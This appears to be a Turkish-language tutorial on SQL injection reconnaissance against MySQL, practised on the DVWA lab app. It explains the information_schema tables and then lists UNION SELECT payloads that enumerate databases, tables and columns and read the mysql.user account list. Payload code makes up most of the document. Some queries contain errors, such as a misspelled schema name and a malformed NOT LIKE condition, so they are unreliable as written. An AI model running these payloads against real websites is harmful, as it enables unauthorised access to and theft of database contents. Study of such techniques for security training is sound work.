

SGL INJECTIN BILGI TOPLAMA

genellikle tüm mysql veritabanlarında information_schema veritabano bulunur bu veritananını kullanarak sitenin veritabanı tablo ve kolon 
bilgilerine ulaşır ve bu bilgiler sayesinde sitenin veritanından çekeceğim verilerin sorgularını oluşturmamda yardımcı olur.

Information içerisindeki bana bilgi verecek tablolar
a)INFORMATION_SCHEMA SCHEMATA-->Mevcut veritabanları hakkında bize bilgi sağlar,Bu tabloda bulunan kolonlar

CATALOG_NAME 
SCHEMA_NAME 
DEFAULT_CHARACTER_SET_NAME 	  	 
DEFAULT_COLLATION_NAME 	  	 
SQL_PATH

Bu tablolardan SCHEMA_NAME =>kolonu bize mysql'deki tüm veritabanı hakkında bilgi verir,aşağıdaki sorgu ile veritabanlarına ulaşabiliriz'
select schema_name from information_schema.schemata

b)INFORMATION_SCHEMA TABLES =>bize tablo hakkında bilgi verir, aşağıda burada yer alan kolonlar bulunmaktadır

TABLE_CATALOG 
TABLE_SCHEMA 
TABLE_NAME

işimize yarayacak kolon TABLE_NAME


c)INFORMATION_SCHEMA COLUMNS =>bize kolonlar hakkında bilgi verir, aşağıda burada yer alan kolonlar bulunmaktadır

TABLE_SCHEMA 	  	 
TABLE_NAME 	  	 
COLUMN_NAME

işimize yarayacak kolon COLUMN_NAME


Şimdi bu öğrendiklerimizi test edelim 
===================================================================================================================
'veritabanını versiyonumuzu öğrenelim'
select version()
-------------------------------------------------------------------------------------------------------------------
'Şimdi veritabanımızın kullanıcısını öğrenelim'
SELECT user(); 
SELECT system_user();
Yada tüm mysql veritanlarında bulunan mysql ile buluruz;
UNION SELECT user FROM mysql.user;
--------------------------------------------------------------------------------------------------------------------

'Mysql deki tüm veri tabanlarına ulaşalım'

UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database();

UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA NOT LIKE 'information_schema';

UNION SELECT schema_name FROM information_schema.schemata;

--------------------------------------------------------------------------------------------------------------------
'DVWA veritabanındaki tablolara ulaşalım'

UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = 'dvwa';

--------------------------------------------------------------------------------------------------------------------

'DVWA Veitabanından Kolonlara Ulaşma'

UNION SELECT TABLE_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'dwva'

union select concat_ws(0x3a,table_name,column_name)from information_schema.COLUMNS where table_schema='sqlinjection'

--------------------------------------------------------------------------------------------------------------------

UNION select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns;

select concat_ws(0x3a,table_schema,table_name,column_name) from  information_schema.columns where table_schema not like 'information_schema' and 'mysql';

Mysql'deki tüm veritabanı ve tablolarını karşısında getirir'
UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'information_schema' AND table_schema!= 'mysql';

Tüm tanımlı kullanıcılar için tanımlı tüm tabloları ve tüm sütunları listeleme
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema !='information_schema' AND table_schema !='mysql';
